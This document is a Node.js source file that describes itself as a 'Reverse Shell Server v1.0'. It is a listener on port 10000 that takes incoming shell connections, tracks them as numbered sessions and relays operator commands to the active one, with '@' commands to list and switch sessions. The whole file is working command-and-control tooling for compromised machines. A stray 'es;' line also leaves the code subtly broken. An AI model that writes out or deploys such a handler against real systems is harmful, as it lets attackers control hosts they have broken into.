const net = require("net");
const readline = require("readline");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

var server = new net.Server();
var sessions_dict = {};

// number of all connected sessions (might already be disconnected)
// each connected session has its own unique identifier
var max_session_number = 1;

// number of session to which commands from input line will be send
var active_session = 0;

Reset = "\x1b[0m";
FgRed = "\x1b[31m";
FgGreen = "\x1b[32m";
FgYellow = "\x1b[33m";
FgBlue = "\x1b[34m";
FgWhite = "\x1b[37m";

server.on("connection", function(socket) {
  console.log(socket.remoteAddress);
  let session_id = max_session_number++;
  sessions_dict[session_id] = socket;

  printSessionPrefix(FgGreen, session_id);
  process.stdout.write(socket.remoteAddress + " " + socket.remotePort + "\n");

  // if no active sessions - connected session becomes active session_id
  if (active_session == 0) active_session = session_id;

  socket.on("data", data => {
    receivedData(session_id, data);
  });
  socket.on("close", () => {
    connClosed(session_id);
  });
  socket.on("error", () => {
    connError(session_id);
  });
});

rl.on("line", line => {
  if (active_session == 0) {
    printInputReady();
    return;
  }

  // no special command in input line
  if (!line.startsWith("@")) {
    sessions_dict[active_session].write(line);
    return;
  }

  if (line === "@") {
    // list all sessions
    let keys = Object.keys(sessions_dict);
    process.stdout.write("Existing sessions:");
    for (let index in keys) {
      if (index > 0) process.stdout.write(" ");
      process.stdout.write("[" + keys[index] + "]");
    }
    process.stdout.write("\n");
  } else {
    // special command - starts with @ provided in input line
    let temp_id = parseInt(line.substr(1));
    if (isNaN(temp_id)) console.log("Invalid session number");
    else if (temp_id in sessions_dict) active_session = temp_id;
    else console.log("No session number:" + temp_id + " exists");
  }
  printInputReady();
});

function printInputReady() {
  printSessionPrefix(FgBlue, active_session);
}

function printSessionPrefix(color, session_id) {
  if (session_id == 0) process.stdout.write(color + "[-no-sessions-] ");
  else process.stdout.write(color + "[" + session_id.toString() + "] ");
}

function receivedData(session_id, data) {
  let lines = data.toString().split("\n");
  for (let index = 0; index < lines.length; index++) {
    printSessionPrefix(FgYellow, session_id);
    // lines contains '\r' char inside - caret return, which might cause side effects
    let line = lines[index].replace("\r", "");
    process.stdout.write(line);
    process.stdout.write("\n");
  }
  printInputReady();
}

function connError(session_id) {
  process.stdout.write("\n");
  printSessionPrefix(FgRed, session_id);
  process.stdout.write("session error\n");
}

function findNextSession(session_id) {
  if (session_id == undefined) throw new Error("session_id is undefined");

  // no more existing sessions
  if (Object.keys(sessions_dict).length == 0) return 0;

  // try to find next larger session number, than currently active
  for (let i = session_id; i < max_session_number; i++) {
    if (i in sessions_dict) return i;
  }

  // try to find available session_id
  for (let i = 1; i < session_id; i++) {
    if (i in sessions_dict) return i;
  }
  throw new Error("sth went wrong");
}
es;

function connClosed(session_id) {
  printSessionPrefix(FgRed, session_id);
  process.stdout.write("session disconnected\n");
  delete sessions_dict[session_id];
  active_session = findNextSession(session_id);
  printInputReady();
}

const port = 10000;
server.listen(port);
console.log("Reverse Shell Server v1.0 - listening on port:" + port);
console.log(
  "CmdLine - enter:\n@ - to list all connected sessions\n@n - to switch to session number n\n\n"
);
printInputReady();
